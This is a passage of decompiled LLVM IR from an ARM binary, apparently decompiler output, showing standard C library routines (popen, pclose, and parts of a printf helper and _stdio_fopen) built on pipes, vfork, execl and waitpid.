  %v0_23ad4 = load i32, i32* @r5, align 4
  %v3_23ad4 = icmp ult i32 %v0_23ad4, %v1_23ad0
  br i1 %v3_23ad4, label %bb28, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_23ad0, i32* @r5, align 4
  br label %bb28

bb28:                                             ; preds = %entry, %bb
  %v1_23adc = phi i32 [ %v0_23ad4, %entry ], [ %v1_23ad0, %bb ]
  %v0_23ae4 = load i32, i32* @r6, align 4
  %v0_23ae8 = load i32, i32* @r7, align 4
  %v3_23b08 = inttoptr i32 %v0_23ae4 to i8*
  %v4_23b08 = call i32 @_vfprintf_internal(i32 %v2_23a94, i8* %v3_23b08, i32 %v0_23ae8)
  %v0_23b0c = load i32, i32* @r5, align 4
  %v1_23b0c = load i32, i32* @sl, align 4
  %v9_23b0c = icmp eq i32 %v0_23b0c, %v1_23b0c
  br i1 %v9_23b0c, label %dec_label_pc_23b34, label %dec_label_pc_23b18

dec_label_pc_23b18:                               ; preds = %bb28
  %v2_23adc = add i32 %v1_23adc, %v0_23ad0
  %v9_23b20 = icmp eq i32 %v1_23adc, 0
  br i1 %v9_23b20, label %bb29, label %bb30

bb29:                                             ; preds = %dec_label_pc_23b18
  %v2_23b24 = add i32 %v0_23ad0, -1
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_23b18, %bb29
  %v1_23b28 = phi i32 [ %v2_23adc, %dec_label_pc_23b18 ], [ %v2_23b24, %bb29 ]
  %v1_23b28.v0_23b00 = select i1 %v9_23b20, i32 %v1_23b28, i32 %v0_23ad0
  %stack_var_-96.0 = inttoptr i32 %v1_23b28.v0_23b00 to i8*
  %v1_23b30 = trunc i32 %v1_23b0c to i8
  store i8 %v1_23b30, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_23b34

dec_label_pc_23b34:                               ; preds = %bb28, %bb30
  store i32 %v3_23a8c, i32* @r4, align 4
  store i32 %v6_23a8c, i32* @r5, align 4
  store i32 %v9_23a8c, i32* @r6, align 4
  store i32 %v12_23a8c, i32* @r7, align 4
  store i32 %v18_23a8c, i32* @sl, align 4
  ret i32 %v4_23b08

; uselistorder directives
  uselistorder i1 %v9_23b20, { 1, 0 }
  uselistorder i32 %v1_23adc, { 1, 0 }
  uselistorder i32 %v1_23ad0, { 2, 1, 0 }
  uselistorder i32 %v0_23ad0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_23b34, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_23b40 = load i32, i32* @r4, align 4
  %v6_23b40 = load i32, i32* @r5, align 4
  %v9_23b40 = load i32, i32* @r6, align 4
  %v12_23b40 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46956), i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_23b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_23b70)
  %v0_23b84 = load i32, i32* @r5, align 4
  %v2_23b84 = add i32 %v0_23b84, 36
  %v3_23b84 = inttoptr i32 %v2_23b84 to i32*
  %v4_23b84 = load i32, i32* %v3_23b84, align 4
  call void @__pseudo_branch(i32 %v4_23b84)
  %v0_23b94 = load i32, i32* @r5, align 4
  %v2_23b94 = add i32 %v0_23b94, 46980
  %v3_23b94 = inttoptr i32 %v2_23b94 to i32*
  %v4_23b94 = load i32, i32* %v3_23b94, align 4
  store i32 %v4_23b94, i32* %r4.global-to-local, align 4
  %v2_23b98 = icmp eq i32 %v4_23b94, 0
  br i1 %v2_23b98, label %dec_label_pc_23be8, label %dec_label_pc_23ba0

dec_label_pc_23ba0:                               ; preds = %entry
  %v1_23ba0 = add i32 %v4_23b94, 4
  %v2_23ba0 = inttoptr i32 %v1_23ba0 to i32*
  %v3_23ba0 = load i32, i32* %v2_23ba0, align 4
  %v1_23ba4 = load i32, i32* @r6, align 4
  %v9_23ba4 = icmp eq i32 %v3_23ba0, %v1_23ba4
  br i1 %v9_23ba4, label %.thread, label %dec_label_pc_23bb4

.thread:                                          ; preds = %dec_label_pc_23ba0
  %v2_23ba8 = inttoptr i32 %v4_23b94 to i32*
  %v3_23ba8 = load i32, i32* %v2_23ba8, align 4
  store i32 %v3_23ba8, i32* %v3_23b94, align 4
  br label %dec_label_pc_23be8

dec_label_pc_23bb4:                               ; preds = %dec_label_pc_23ba0, %dec_label_pc_23bd4
  %v1_23be4 = phi i32 [ %v2_23bb8, %dec_label_pc_23bd4 ], [ %v4_23b94, %dec_label_pc_23ba0 ]
  %v1_23bb8 = inttoptr i32 %v1_23be4 to i32*
  %v2_23bb8 = load i32, i32* %v1_23bb8, align 4
  store i32 %v2_23bb8, i32* %r4.global-to-local, align 4
  %v2_23bbc = icmp eq i32 %v2_23bb8, 0
  br i1 %v2_23bbc, label %dec_label_pc_23bc4, label %dec_label_pc_23bd4

dec_label_pc_23bc4:                               ; preds = %dec_label_pc_23bb4
  %v0_23bc4 = call i32 @__GI___errno_location()
  %v2_23bcc = inttoptr i32 %v0_23bc4 to i32*
  store i32 22, i32* %v2_23bcc, align 4
  br label %dec_label_pc_23be8

dec_label_pc_23bd4:                               ; preds = %dec_label_pc_23bb4
  %v1_23bd4 = add i32 %v2_23bb8, 4
  %v2_23bd4 = inttoptr i32 %v1_23bd4 to i32*
  %v3_23bd4 = load i32, i32* %v2_23bd4, align 4
  %v9_23bd8 = icmp eq i32 %v3_23bd4, %v1_23ba4
  br i1 %v9_23bd8, label %dec_label_pc_23be0, label %dec_label_pc_23bb4

dec_label_pc_23be0:                               ; preds = %dec_label_pc_23bd4
  %v1_23be0 = inttoptr i32 %v2_23bb8 to i32*
  %v2_23be0 = load i32, i32* %v1_23be0, align 4
  store i32 %v2_23be0, i32* %v1_23bb8, align 4
  br label %dec_label_pc_23be8

dec_label_pc_23be8:                               ; preds = %.thread, %entry, %dec_label_pc_23bc4, %dec_label_pc_23be0
  %v0_23bf4 = load i32, i32* @r5, align 4
  %v2_23bf4 = add i32 %v0_23bf4, 76
  %v3_23bf4 = inttoptr i32 %v2_23bf4 to i32*
  %v4_23bf4 = load i32, i32* %v3_23bf4, align 4
  store i32 146432, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_23bf4)
  %v0_23c00 = load i32, i32* %r4.global-to-local, align 4
  %v2_23c00 = icmp eq i32 %v0_23c00, 0
  br i1 %v2_23c00, label %dec_label_pc_23c50, label %dec_label_pc_23c08

dec_label_pc_23c08:                               ; preds = %dec_label_pc_23be8
  store i32 %v0_23c00, i32* @r0, align 4
  %v1_23c0c = add i32 %v0_23c00, 8
  %v2_23c0c = inttoptr i32 %v1_23c0c to i32*
  %v3_23c0c = load i32, i32* %v2_23c0c, align 4
  store i32 %v3_23c0c, i32* @r4, align 4
  %v0_23c10 = call i32 @free()
  %v0_23c14 = load i32, i32* @r6, align 4
  %v1_23c18 = inttoptr i32 %v0_23c14 to i16*
  %v2_23c18 = call i32 @__GI_fclose(i16* %v1_23c18)
  %v2_23c1c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_23c1c, i32* @r5, align 4
  br label %dec_label_pc_23c20

dec_label_pc_23c20:                               ; preds = %dec_label_pc_23c3c, %dec_label_pc_23c08
  %v0_23c28 = load i32, i32* @r4, align 4
  %v3_23c2c = call i32 @waitpid(i32 %v0_23c28, i32 %v2_23c1c, i32 0)
  %v1_23c30 = icmp slt i32 %v3_23c2c, 0
  br i1 %v1_23c30, label %dec_label_pc_23c3c, label %dec_label_pc_23c50.loopexit

dec_label_pc_23c3c:                               ; preds = %dec_label_pc_23c20
  %v0_23c3c = call i32 @__GI___errno_location()
  %v1_23c40 = inttoptr i32 %v0_23c3c to i32*
  %v2_23c40 = load i32, i32* %v1_23c40, align 4
  %v7_23c44 = icmp eq i32 %v2_23c40, 4
  br i1 %v7_23c44, label %dec_label_pc_23c20, label %dec_label_pc_23c50

dec_label_pc_23c50.loopexit:                      ; preds = %dec_label_pc_23c20
  %v6_23c34 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_23c50

dec_label_pc_23c50:                               ; preds = %dec_label_pc_23c3c, %dec_label_pc_23be8, %dec_label_pc_23c50.loopexit
  %storemerge = phi i32 [ %v6_23c34, %dec_label_pc_23c50.loopexit ], [ -1, %dec_label_pc_23be8 ], [ -1, %dec_label_pc_23c3c ]
  store i32 %v3_23b40, i32* @r4, align 4
  store i32 %v6_23b40, i32* @r5, align 4
  store i32 %v9_23b40, i32* @r6, align 4
  store i32 %v12_23b40, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_23c00, { 1, 0, 2 }
  uselistorder i32 %v2_23bb8, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 1, 4, 3, 0, 2 }
  uselistorder label %dec_label_pc_23c50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_23be8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_23bb4, { 1, 0 }
}

define i32 @function_23c64(i32 %arg1) local_unnamed_addr {
dec_label_pc_23c64:
  %v0_23c64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_23c64, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_23c64
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_23c64, %bb
  %v4_23c74 = phi i32 [ %arg1, %dec_label_pc_23c64 ], [ 0, %bb ]
  ret i32 %v4_23c74

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_23c78 = load i32, i32* @r4, align 4
  store i32 %v3_23c78, i32* %stack_var_-20, align 4
  %v6_23c78 = load i32, i32* @r5, align 4
  %v9_23c78 = load i32, i32* @r6, align 4
  %v12_23c78 = load i32, i32* @r7, align 4
  %v15_23c78 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_23c80 = load i8, i8* %arg2, align 1
  %v4_23c80 = zext i8 %v3_23c80 to i32
  store i32 %v4_23c80, i32* %r3.global-to-local, align 4
  %v7_23c8c = icmp eq i8 %v3_23c80, 119
  br i1 %v7_23c8c, label %dec_label_pc_23cc8, label %dec_label_pc_23ca0

dec_label_pc_23ca0:                               ; preds = %entry
  %v7_23ca0 = icmp eq i8 %v3_23c80, 114
  br i1 %v7_23ca0, label %bb, label %dec_label_pc_23cb0

bb:                                               ; preds = %dec_label_pc_23ca0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_23cd0

dec_label_pc_23cb0:                               ; preds = %dec_label_pc_23ca0
  %v0_23cb0 = call i32 @__GI___errno_location()
  store i32 %v0_23cb0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_23cc0 = inttoptr i32 %v0_23cb0 to i32*
  store i32 22, i32* %v2_23cc0, align 4
  br label %dec_label_pc_23f04

dec_label_pc_23cc8:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_23cd0

dec_label_pc_23cd0:                               ; preds = %bb, %dec_label_pc_23cc8
  %v0_23dc4 = phi i32 [ 0, %dec_label_pc_23cc8 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_23cd4 = call i32 @malloc(i32 12)
  store i32 %v1_23cd4, i32* %r0.global-to-local, align 4
  store i32 %v1_23cd4, i32* %r3.global-to-local, align 4
  %v2_23cd8 = icmp eq i32 %v1_23cd4, 0
  br i1 %v2_23cd8, label %dec_label_pc_23f04, label %dec_label_pc_23ce4

dec_label_pc_23ce4:                               ; preds = %dec_label_pc_23cd0
  %v2_23ce4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_23ce4, i32* %r0.global-to-local, align 4
  %v1_23cec = call i32 @__GI_pipe(i32 %v2_23ce4)
  store i32 %v1_23cec, i32* %r0.global-to-local, align 4
  %v2_23cf0 = icmp eq i32 %v1_23cec, 0
  br i1 %v2_23cf0, label %dec_label_pc_23cf8, label %dec_label_pc_23ef4

dec_label_pc_23cf8:                               ; preds = %dec_label_pc_23ce4
  store i32 %v0_23dc4, i32* %r0.global-to-local, align 4
  %v2_23cfc = ptrtoint i32* %stack_var_-24 to i32
  %v1_23d00 = xor i32 %v0_23dc4, 1
  store i32 -8, i32* %r2.global-to-local, align 4
  %tmp26 = sub nsw i32 0, %v1_23d00
  %v4_23d08 = and i32 %tmp26, 4
  %v5_23d08 = add i32 %v4_23d08, %v2_23cfc
  store i32 %v5_23d08, i32* %r3.global-to-local, align 4
  %v2_23d0c = add i32 %v5_23d08, -8
  %v3_23d0c = inttoptr i32 %v2_23d0c to i32*
  %v4_23d0c = load i32, i32* %v3_23d0c, align 4
  store i32 %v2_23cfc, i32* @ip, align 4
  %tmp27 = sub nsw i32 0, %v0_23dc4
  %v4_23d18 = and i32 %tmp27, 4
  %v5_23d18 = add i32 %v4_23d18, %v2_23cfc
  store i32 %v5_23d18, i32* %r3.global-to-local, align 4
  %v2_23d1c = add i32 %v5_23d18, -8
  %v3_23d1c = inttoptr i32 %v2_23d1c to i32*
  %v4_23d1c = load i32, i32* %v3_23d1c, align 4
  store i32 %v4_23d1c, i32* @r3, align 4
  %v0_23d20 = load i32, i32* @r4, align 4
  store i32 %v4_23d0c, i32* %r0.global-to-local, align 4
  %v7_23d2c = call i32 @fdopen(i32 %v4_23d0c, i32 %v0_23d20, i32 -8, i32 %v4_23d1c, i32 %v4_23d0c, i32 %v4_23d1c)
  store i32 %v7_23d2c, i32* %r0.global-to-local, align 4
  %v2_23d30 = icmp eq i32 %v7_23d2c, 0
  br i1 %v2_23d30, label %dec_label_pc_23d3c, label %dec_label_pc_23d50

dec_label_pc_23d3c:                               ; preds = %dec_label_pc_23cf8
  store i32 %v4_23d0c, i32* %r0.global-to-local, align 4
  %v1_23d40 = call i32 @__GI_close(i32 %v4_23d0c)
  store i32 %v4_23d1c, i32* %r0.global-to-local, align 4
  %v1_23d48 = call i32 @__GI_close(i32 %v4_23d1c)
  store i32 %v1_23d48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23ef4

dec_label_pc_23d50:                               ; preds = %dec_label_pc_23cf8
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 46956, i32* %r4.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46956), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46956), i32* %r2.global-to-local, align 4
  %v2_23d70 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_23d70, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_23d7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_23d7c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_23d7c)
  %v0_23d88 = load i32, i32* @r4, align 4
  store i32 %v0_23d88, i32* @r0, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_23d94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), align 4
  store i32 %v4_23d94, i32* %ip.global-to-local, align 4
  store i32 146848, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_23d94)
  %v0_23da0 = call i32 @__vfork()
  store i32 %v0_23da0, i32* %r0.global-to-local, align 4
  store i32 %v0_23da0, i32* @r5, align 4
  %v2_23da4 = icmp eq i32 %v0_23da0, 0
  br i1 %v2_23da4, label %dec_label_pc_23dac, label %dec_label_pc_23e38

dec_label_pc_23dac:                               ; preds = %dec_label_pc_23d50
  store i32 %v4_23d0c, i32* %r0.global-to-local, align 4
  %v1_23db0 = call i32 @__GI_close(i32 %v4_23d0c)
  store i32 %v1_23db0, i32* %r0.global-to-local, align 4
  store i32 %v4_23d1c, i32* %r2.global-to-local, align 4
  store i32 %v0_23dc4, i32* %r3.global-to-local, align 4
  %v9_23dbc = icmp eq i32 %v4_23d1c, %v0_23dc4
  br i1 %v9_23dbc, label %dec_label_pc_23dd8, label %dec_label_pc_23dc4

dec_label_pc_23dc4:                               ; preds = %dec_label_pc_23dac
  store i32 %v4_23d1c, i32* %r0.global-to-local, align 4
  %v2_23dcc = call i32 @dup2(i32 %v4_23d1c, i32 %v0_23dc4)
  store i32 %v4_23d1c, i32* %r0.global-to-local, align 4
  %v1_23dd4 = call i32 @__GI_close(i32 %v4_23d1c)
  store i32 %v1_23dd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23dd8

dec_label_pc_23dd8:                               ; preds = %dec_label_pc_23dac, %dec_label_pc_23dc4
  store i32 46980, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %storemerge3 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46980) to i32*), align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_23df85 = icmp eq i32 %storemerge3, 0
  br i1 %v2_23df85, label %dec_label_pc_23e00, label %dec_label_pc_23de8

dec_label_pc_23de8:                               ; preds = %dec_label_pc_23dd8, %dec_label_pc_23de8
  %v0_23de8 = phi i32 [ %storemerge, %dec_label_pc_23de8 ], [ %storemerge3, %dec_label_pc_23dd8 ]
  %v1_23de8 = add i32 %v0_23de8, 4
  %v2_23de8 = inttoptr i32 %v1_23de8 to i32*
  %v3_23de8 = load i32, i32* %v2_23de8, align 4
  store i32 %v3_23de8, i32* %r3.global-to-local, align 4
  %v1_23dec = add i32 %v3_23de8, 4
  %v2_23dec = inttoptr i32 %v1_23dec to i32*
  %v3_23dec = load i32, i32* %v2_23dec, align 4
  store i32 %v3_23dec, i32* %r0.global-to-local, align 4
  %v1_23df0 = call i32 @__GI_close(i32 %v3_23dec)
  store i32 %v1_23df0, i32* %r0.global-to-local, align 4
  %v0_23df4 = load i32, i32* @r4, align 4
  %storemerge.in = inttoptr i32 %v0_23df4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_23df8 = icmp eq i32 %storemerge, 0
  br i1 %v2_23df8, label %dec_label_pc_23e00, label %dec_label_pc_23de8

dec_label_pc_23e00:                               ; preds = %dec_label_pc_23de8, %dec_label_pc_23dd8
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39488), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39500), i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v5_23e2c = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39500), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39492), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39488), i32 %arg1, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_23e34 = call i32 @__GI__exit(i32 127)
  store i32 %v1_23e34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23e38

dec_label_pc_23e38:                               ; preds = %dec_label_pc_23d50, %dec_label_pc_23e00
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  store i32 %v2_23d70, i32* @r6, align 4
  %v4_23e44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 76) to i32*), align 4
  store i32 %v4_23e44, i32* @r7, align 4
  store i32 %v2_23d70, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23e58.1595 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_23e44)
  store i32 %v4_23d1c, i32* %r0.global-to-local, align 4
  %v1_23e5c = call i32 @__GI_close(i32 %v4_23d1c)
  store i32 %v1_23e5c, i32* %r0.global-to-local, align 4
  %v0_23e60 = load i32, i32* @r5, align 4
  %tmp29 = icmp slt i32 %v0_23e60, 1
  br i1 %tmp29, label %dec_label_pc_23eec, label %dec_label_pc_23e68

dec_label_pc_23e68:                               ; preds = %dec_label_pc_23e38
  store i32 %v7_23d2c, i32* %r3.global-to-local, align 4
  store i32 %v1_23cd4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46956), i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v2_23e84 = add i32 %v1_23cd4, 8
  %v3_23e84 = inttoptr i32 %v2_23e84 to i32*
  store i32 %v0_23e60, i32* %v3_23e84, align 4
  %v0_23e88 = load i32, i32* %r3.global-to-local, align 4
  %v1_23e88 = load i32, i32* %r2.global-to-local, align 4
  %v2_23e88 = add i32 %v1_23e88, 4
  %v3_23e88 = inttoptr i32 %v2_23e88 to i32*
  store i32 %v0_23e88, i32* %v3_23e88, align 4
  %v0_23e90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_23e90, i32* %r2.global-to-local, align 4
  store i32 %v2_23d70, i32* %r0.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_23e9c = load i32, i32* %ip.global-to-local, align 4
  %v2_23e9c = add i32 %v0_23e9c, 164
  %v3_23e9c = inttoptr i32 %v2_23e9c to i32*
  %v4_23e9c = load i32, i32* %v3_23e9c, align 4
  store i32 %v4_23e9c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_23e9c)
  %v0_23eac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_23eac, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_23eb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), align 4
  store i32 %v4_23eb4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_23eb4)
  store i32 46980, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  store i32 %v1_23cd4, i32* %r0.global-to-local, align 4
  %v4_23ecc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46980) to i32*), align 4
  store i32 %v4_23ecc, i32* %r3.global-to-local, align 4
  %v2_23ed4 = inttoptr i32 %v1_23cd4 to i32*
  store i32 %v4_23ecc, i32* %v2_23ed4, align 4
  %v0_23ed8 = load i32, i32* %r0.global-to-local, align 4
  %v1_23ed8 = load i32, i32* @ip, align 4
  %v2_23ed8 = load i32, i32* %r2.global-to-local, align 4
  %v3_23ed8 = add i32 %v2_23ed8, %v1_23ed8
  %v4_23ed8 = inttoptr i32 %v3_23ed8 to i32*
  store i32 %v0_23ed8, i32* %v4_23ed8, align 4
  store i32 %v2_23d70, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_23e44)
  br label %dec_label_pc_23f04

dec_label_pc_23eec:                               ; preds = %dec_label_pc_23e38
  store i32 %v7_23d2c, i32* %r0.global-to-local, align 4
  %v1_23ef0 = inttoptr i32 %v7_23d2c to i16*
  %v2_23ef0 = call i32 @__GI_fclose(i16* %v1_23ef0)
  store i32 %v2_23ef0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23ef4

dec_label_pc_23ef4:                               ; preds = %dec_label_pc_23ce4, %dec_label_pc_23d3c, %dec_label_pc_23eec
  store i32 %v1_23cd4, i32* @r0, align 4
  %v0_23ef8 = call i32 @free()
  store i32 %v0_23ef8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23f04

dec_label_pc_23f04:                               ; preds = %dec_label_pc_23cd0, %dec_label_pc_23e68, %dec_label_pc_23cb0, %dec_label_pc_23ef4
  %stack_var_-68.1 = phi i32 [ 0, %dec_label_pc_23cd0 ], [ 0, %dec_label_pc_23ef4 ], [ %v7_23d2c, %dec_label_pc_23e68 ], [ 0, %dec_label_pc_23cb0 ]
  store i32 %stack_var_-68.1, i32* %r0.global-to-local, align 4
  %v2_23f0c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_23f0c, i32* @r4, align 4
  store i32 %v6_23c78, i32* @r5, align 4
  store i32 %v9_23c78, i32* @r6, align 4
  store i32 %v12_23c78, i32* @r7, align 4
  store i32 %v15_23c78, i32* @lr, align 4
  ret i32 %stack_var_-68.1

; uselistorder directives
  uselistorder i32 %stack_var_-68.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_23d2c, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_23d1c, { 3, 2, 1, 0, 7, 6, 9, 8, 5, 4, 11, 10, 12 }
  uselistorder i32 %v4_23d0c, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_23cfc, { 0, 2, 1 }
  uselistorder i32 %v1_23cd4, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %v0_23dc4, { 1, 4, 3, 0, 2, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 9, 3, 4, 5, 6, 7, 8, 12, 10, 11, 13, 15, 14, 17, 16, 19, 18, 20, 22, 21, 25, 23, 24, 27, 26, 28, 31, 29, 30, 33, 32, 35, 34, 36, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46980) to i32*), { 1, 0 }
  uselistorder i32 46980, { 1, 0, 2, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46956), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_pipe, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_23f04, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_23ef4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_23e38, { 1, 0 }
  uselistorder label %dec_label_pc_23de8, { 1, 0 }
  uselistorder label %dec_label_pc_23dd8, { 1, 0 }
  uselistorder label %dec_label_pc_23cd0, { 1, 0 }
}

define i32 @function_23f20(i32 %arg1) local_unnamed_addr {
dec_label_pc_23f20:
  %v0_23f20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_23f20, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_23f20
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_23f20, %bb
  %v7_23f28 = phi i32 [ %arg1, %dec_label_pc_23f20 ], [ 0, %bb ]
  ret i32 %v7_23f28

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_23f3c = load i32, i32* @r4, align 4
  store i32 %v3_23f3c, i32* %stack_var_-36, align 4
  %v6_23f3c = load i32, i32* @r5, align 4
  %v9_23f3c = load i32, i32* @r6, align 4
  %v18_23f3c = load i32, i32* @sb, align 4
  %v24_23f3c = load i32, i32* @fp, align 4
  %v0_23f40 = load i32, i32* @r1, align 4
  %v1_23f40 = inttoptr i32 %v0_23f40 to i8*
  %v2_23f40 = load i8, i8* %v1_23f40, align 1
  %v3_23f40 = zext i8 %v2_23f40 to i32
  store i32 %v3_23f40, i32* @ip, align 4
  %v7_23f48 = icmp eq i8 %v2_23f40, 114
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @fp, align 4
  %v2_23f50 = ptrtoint i32* %stack_var_-72 to i32
  %v0_23f54 = load i32, i32* @r0, align 4
  store i32 %v0_23f54, i32* @r6, align 4
  %v0_23f58 = load i32, i32* @r2, align 4
  store i32 %v0_23f58, i32* @sb, align 4
  %v0_23f5c = load i32, i32* @r3, align 4
  store i32 %v0_23f5c, i32* @r5, align 4
  br i1 %v7_23f48, label %dec_label_pc_23fa8, label %dec_label_pc_23f64

dec_label_pc_23f64:                               ; preds = %entry
  %v7_23f64 = icmp eq i8 %v2_23f40, 119
  br i1 %v7_23f64, label %bb, label %dec_label_pc_23f70

bb:                                               ; preds = %dec_label_pc_23f64
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_23fac

dec_label_pc_23f70:                               ; preds = %dec_label_pc_23f64
